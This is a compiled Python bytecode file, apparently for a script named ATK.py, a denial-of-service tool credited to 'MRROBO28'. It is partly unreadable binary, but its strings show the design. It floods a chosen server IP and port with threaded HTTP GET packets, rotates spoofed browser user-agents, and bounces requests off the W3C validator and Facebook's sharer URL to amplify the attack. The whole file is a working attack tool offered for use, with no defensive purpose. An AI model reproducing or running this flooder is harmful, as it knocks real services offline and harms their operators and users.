U
    �N>_�  �                
   @   sB  d dl mZ d dlmZ d dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Zd dlZdZdZdZdZdZd	d
� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zedd�Ze�� ae��  e� Z e� Z!e"dk�r>e#ej$�dk r�e�  e�  e%dt&d e't(�d!e't)�d"� e%d#� e�  e�  e�*d$� z0e�ej+ej,�Z-e-�.t&e/t(�f� e-�0d%� W n4 ej1k
�r� Z2 ze%d&� e�  W 5 dZ2[2X Y nX e3e/t)��D ]:Z4ej5ed'�Z6d(e6_7e6�8�  ej5ed'�Z9d(e9_7e9�8�  �q�e�� Z8d a:t:d)k�r
d a:e�*d*� t:d% a:e �;t:� e!�;t:� �q�e �<�  e!�<�  �q�dS )+�    )�Queue)�OptionParserNz[1;35mz[1;36mz[31;1mz[1;33mz[1;37mc                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
g�?)�sys�stdout�write�flush�time�sleep)�s�c� r   �ATK.py�wr
   s    
r   c                   C   sN   g a t �d� t �d� t �d� t �d� t �d� t �d� t �d� t S )Nz>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14zJMozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3zjMozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zyMozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7zmMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zXMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1)�uagent�appendr   r   r   r   �
user_agent   s    






r   c                   C   s   g a t �d� t �d� t S )Nz"http://validator.w3.org/check?uri=z,http://www.facebook.com/sharer/sharer.php?u=)�botsr   r   r   r   r   �my_bots   s    

r   c                 C   sV   z:t j�t jj| dt�t�id��}td� t�	d� qW n   t�	d� Y nX d S )Nz
User-Agent)�headersz[94mbot is hammering...[0m皙�����?)
�urllibZrequestZurlopenZRequest�random�choicer   �printr	   r
   )ZurlZreqr   r   r   �bot_hammering%   s    "r   c              
   C   s�   z�t dt d t�t� d t ��d�}t�tjtj	�}|�
ttt�f� |�|ttt�f�r�|�d� tdt�t�� �d� n|�d� td� t�d	� qW n6 tjk
r� } ztd
� t�d	� W 5 d }~X Y nX d S )NzGET / HTTP/1.1
Host: z

 User-Agent: r   zutf-8�   �[92mz,[0m [94m <--packet sent! Attacking--> [0mz[91mshut<->down[0mr   z)[91mno connection! server maybe down[0m)�str�hostr   r   r   �data�encode�socket�AF_INET�SOCK_STREAM�connect�int�portZsendtoZshutdownr   r	   �ctimer
   �error)�itemZpacketr   �er   r   r   �down_it/   s    (

r,   c                  C   s   t �� } t| � t ��  q d S )N)�q�getr,   �	task_done�r*   r   r   r   �dosB   s    r1   c                  C   s,   t �� } tt�t�d t � t ��  q d S )Nzhttp://)�wr.   r   r   r   r   r   r/   r0   r   r   r   �dos2I   s    r3   c                  C   s�   t �d� tt� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� d�� ttd t d t	 �} | dkr~t �d� n| dkr�t
��  t
��  d S )N�clearz ____  ____   ___  ____       z _  _____ _____  _    ____ _  __
z|  _ \|  _ \ / _ \/ ___|     z"/ \|_   _|_   _|/ \  / ___| |/ / 
z| | | | | | | | | \___ \    z#/ _ \ | |   | | / _ \| |   | ' /  
z| |_| | |_| | |_| |___) |  z$/ ___ \| |   | |/ ___ \ |___| . \  
z|____/|____/ \___/|____/  a�  /_/   \_\_|   |_/_/   \_\____|_|\_\ 
	[37;1m
	=============================
       	[0;32mAuthor[37;1m : [0;36m MRROBO28
	[0;32mgithub[37;1m : [0;36mhttps://github.com/MRROBO28
	[0;32mYoutube[37;1m : [0;36m MR_ROBO.28[37;1m
        ============================= 
	[1;33musage : python ATK.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 [0mzcari IP website dulu?z[y/n] �yz
sh ping.sh�n)�os�systemr   �mr   �p�input�u�k�br   �exit)Zpilr   r   r   �usageP   s"    

�
�
�
�r@   c               	   C   s�   t ddd�} | jdddddtjtjd	� | jd
dddd� | jdddddd� | jdddddd� | jdddddd� | �� \}}tj|jdd � |jr�t	�  |j
d k	r�|j
a
nt	�  |jd kr�d!an|ja|jd kr�d"an|jad S )#NFZHammers)Zadd_help_optionZepilogz-qz--quietzset logging to ERRORZstore_const�loglevel)�help�action�destZconst�defaultz-sz--serverr   zattack to server ip -s ip)rD   rB   z-pz--portr&   r'   z-p 80 default 80)�typerD   rB   z-tz--turbo�turbozdefault 135 -t 135z-hz--helprB   �
store_truezhelp you)rD   rC   rB   z%(levelname)-8s %(message)s)�level�format�P   �   )r   Z
add_option�loggingZERROR�INFO�
parse_argsZbasicConfigrA   rB   r@   r   r'   rG   �thr)ZoptpZopts�argsr   r   r   �get_parametersk   s&    


rR   zheaders.txt�r�__main__�   r   z port: z turbo: z[0mz[94mPlease wait...[0m�   r   z![91mcheck server ip and port[0m)�targetTi  r   )=Zqueuer   Zoptparser   r7   r	   r   r"   Z	threadingrM   Zurllib.requestr   r   r<   r>   r9   r=   r:   r   r   r   r   r,   r1   r3   r@   rR   �openr   �readr    �closer-   r2   �__name__�len�argvr   r   r   r'   rP   r
   r#   r$   r   r%   r&   Z
settimeoutr)   r+   �range�iZThread�tZdaemon�start�t2r*   Zput�joinr   r   r   r   �<module>   sl   @






